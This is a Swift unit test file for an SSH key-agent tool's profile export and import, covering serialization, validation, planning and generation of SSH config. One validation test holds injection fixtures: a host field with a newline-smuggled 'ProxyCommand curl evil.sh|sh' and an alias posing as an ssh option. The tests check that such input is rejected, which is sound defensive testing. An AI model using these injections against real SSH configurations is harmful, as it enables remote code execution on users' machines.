import Foundation
import XCTest

@testable import FobKit

final class ProfileTests: XCTestCase {
    private func sampleKey(_ name: String, policy: KeyPolicy = KeyPolicy()) -> Profile.Key {
        Profile.Key(name: name, policy: policy)
    }

    private func sampleHost(_ alias: String, key: String, host: String = "example.com",
                            user: String = "deploy", port: Int = 22) -> Profile.Host {
        Profile.Host(alias: alias, hostName: host, user: user, port: port,
                     keyName: key, isGitHost: false)
    }

    // MARK: - Round-trip

    /// The manifest must survive JSON exactly — including a *default* policy, which the store
    /// represents as "no record" but the profile has to state explicitly.
    func testRoundTripPreservesPoliciesIncludingDefault() throws {
        let profile = Profile(
            exportedAt: "2026-01-01T00:00:00Z",
            keys: [
                sampleKey("plain"),
                Profile.Key(name: "pinned",
                            policy: KeyPolicy(pinnedHostKeys: [Data([1, 2, 3])], reuseSeconds: 30,
                                              allowedNamespaces: ["git"], namespaceChoiceMade: true,
                                              requireBiometry: true),
                            oldFingerprint: "SHA256:abc", signsCommits: true,
                            signingEmail: "me@example.com"),
            ],
            hosts: [sampleHost("web", key: "plain")],
            signing: Profile.Signing(allowedSignersFile: "~/.ssh/allowed_signers"))

        let data = try JSONEncoder().encode(profile)
        let decoded = try JSONDecoder().decode(Profile.self, from: data)

        XCTAssertEqual(decoded, profile)
        XCTAssertTrue(decoded.keys[0].policy.isDefault, "an open policy round-trips as open")
        XCTAssertEqual(decoded.keys[1].policy.requireBiometry, true, "protection level survives")
        XCTAssertEqual(decoded.keys[1].policy.pinnedHostKeys, [Data([1, 2, 3])], "pins survive")
    }

    /// A profile must never carry key material. This is the property the whole design rests on.
    func testEncodedProfileContainsNoPrivateKeyFields() throws {
        let profile = Profile(exportedAt: "t", keys: [sampleKey("k")], hosts: [])
        let json = String(decoding: try JSONEncoder().encode(profile), as: UTF8.self).lowercased()
        for forbidden in ["privatekey", "datarepresentation", "secret", "begin openssh"] {
            XCTAssertFalse(json.contains(forbidden), "profile leaked '\(forbidden)'")
        }
    }

    // MARK: - Validation (the manifest is untrusted input)

    func testValidateAcceptsCleanProfile() {
        let profile = Profile(exportedAt: "t", keys: [sampleKey("web")],
                              hosts: [sampleHost("web", key: "web")])
        XCTAssertTrue(profile.validate().isEmpty)
    }

    /// `configBlock` interpolates verbatim, so a newline would inject ssh directives and a leading
    /// dash would later be read as an ssh option. Both must be refused before anything is written.
    func testValidateRejectsInjectionAndUnsafeTokens() {
        let profile = Profile(
            exportedAt: "t",
            keys: [sampleKey("ok")],
            hosts: [
                Profile.Host(alias: "evil", hostName: "example.com\n  ProxyCommand curl evil.sh|sh",
                             user: "deploy", port: 22, keyName: "ok", isGitHost: false),
                Profile.Host(alias: "-oProxyCommand=x", hostName: "example.com",
                             user: "deploy", port: 22, keyName: "ok", isGitHost: false),
                Profile.Host(alias: "tabs", hostName: "example.com", user: "de\tploy",
                             port: 22, keyName: "ok", isGitHost: false),
                Profile.Host(alias: "badport", hostName: "example.com", user: "deploy",
                             port: 99999, keyName: "ok", isGitHost: false),
            ])
        let issues = profile.validate()
        XCTAssertEqual(issues.count, 4, "each unsafe field is reported: \(issues)")
        XCTAssertTrue(issues.allSatisfy {
            if case .invalidHostField = $0 { return true } else { return false }
        })
    }

    func testValidateRejectsBadKeyNamesDuplicatesAndDanglingReferences() {
        let profile = Profile(
            exportedAt: "t",
            keys: [sampleKey("../escape"), sampleKey("dup"), sampleKey("dup")],
            hosts: [sampleHost("orphan", key: "missing")])
        let issues = profile.validate()
        XCTAssertTrue(issues.contains(.invalidKeyName("../escape")), "\(issues)")
        XCTAssertTrue(issues.contains(.duplicateKeyName("dup")), "\(issues)")
        XCTAssertTrue(issues.contains(.unknownKeyReference(alias: "orphan", keyName: "missing")), "\(issues)")
    }

    func testValidateRejectsNewerSchema() {
        let profile = Profile(version: Profile.currentVersion + 1, exportedAt: "t",
                              keys: [], hosts: [])
        XCTAssertTrue(profile.validate().contains(.unsupportedVersion(Profile.currentVersion + 1)))
    }

    // MARK: - Planning

    func testPlanSkipsExistingKeysAndHosts() {
        let profile = Profile(
            exportedAt: "t",
            keys: [sampleKey("fresh"), sampleKey("already")],
            hosts: [sampleHost("newhost", key: "fresh"), sampleHost("oldhost", key: "already")])
        let existingConfig = "Host oldhost\n  HostName old.example\n"

        let plan = profile.plan(existingKeys: ["already"], existingConfig: existingConfig)

        XCTAssertEqual(plan.keysToCreate.map(\.name), ["fresh"])
        XCTAssertEqual(plan.keysSkipped, ["already"], "never overwrite an existing key")
        XCTAssertEqual(plan.hostsToAdd.map(\.alias), ["newhost"])
        XCTAssertEqual(plan.hostsSkipped.map(\.alias), ["oldhost"])
    }

    /// Same CWE-706 rule the migrate/adopt flows enforce: a block shared by several patterns must
    /// not be touched, since editing it rewrites the siblings' auth too.
    func testPlanRefusesSharedHostLine() {
        let profile = Profile(exportedAt: "t", keys: [sampleKey("k")],
                              hosts: [sampleHost("web", key: "k")])
        let plan = profile.plan(existingKeys: [],
                                existingConfig: "Host web staging\n  HostName shared.example\n")
        XCTAssertTrue(plan.hostsToAdd.isEmpty)
        XCTAssertEqual(plan.hostsSkipped.first?.alias, "web")
        XCTAssertTrue(plan.hostsSkipped.first?.reason.contains("staging") == true,
                      "names the sibling it would have clobbered")
    }

    // MARK: - Dropped directives (what the export warns about)

    /// Only names are collected, never values — a ProxyCommand can carry internal hosts or
    /// credentials, and a profile is meant to travel between machines.
    func testDroppedDirectivesNamesOnlyAndScopedToTheBlock() {
        let config = """
        Host web
          HostName web.example
          User deploy
          Port 2222
          IdentityAgent ~/.fob/agent.sock
          IdentityFile ~/.ssh/fob_web.pub
          IdentitiesOnly yes
          ProxyJump bastion.example
          ForwardAgent yes
          # a comment

        Host other
          RemoteForward 9000 localhost:9000
        """
        let dropped = Profile.droppedDirectives(forAlias: "web", in: config)
        XCTAssertEqual(dropped, ["ProxyJump", "ForwardAgent"])
        XCTAssertFalse(dropped.contains("RemoteForward"), "stops at the next Host block")
        XCTAssertFalse(dropped.joined().contains("bastion"), "values are never captured")
        XCTAssertTrue(Profile.droppedDirectives(forAlias: "missing", in: config).isEmpty)
    }

    // MARK: - Config generation

    func testConfigTextAppendsBlocksUsingLocalPaths() {
        let hosts = [sampleHost("web", key: "web"),
                     sampleHost("db", key: "web", host: "db.example", user: "root", port: 2222)]
        let text = Profile.configText(applying: hosts, to: "Host existing\n  HostName e.example\n",
                                      socketPath: "/Users/new/.fob/agent.sock",
                                      pubPath: { "/Users/new/.ssh/fob_\($0).pub" })

        XCTAssertTrue(text.hasPrefix("Host existing"), "existing config preserved")
        XCTAssertTrue(text.contains("Host web"))
        XCTAssertTrue(text.contains("Host db"))
        XCTAssertTrue(text.contains("\n  Port 2222\n"), "non-default port carried")
        XCTAssertFalse(text.contains("\n  Port 22\n"), "default port omitted, as configBlock does")
        XCTAssertTrue(text.contains("IdentityAgent /Users/new/.fob/agent.sock"))
        XCTAssertTrue(text.contains("IdentityFile /Users/new/.ssh/fob_web.pub"))
        XCTAssertFalse(text.contains("/Users/old/"), "no path from the exporting machine")
    }

    func testConfigTextIsUnchangedWithNoHosts() {
        let original = "Host a\n  HostName a.example\n"
        XCTAssertEqual(Profile.configText(applying: [], to: original,
                                          socketPath: "/s", pubPath: { "/\($0)" }), original)
    }
}
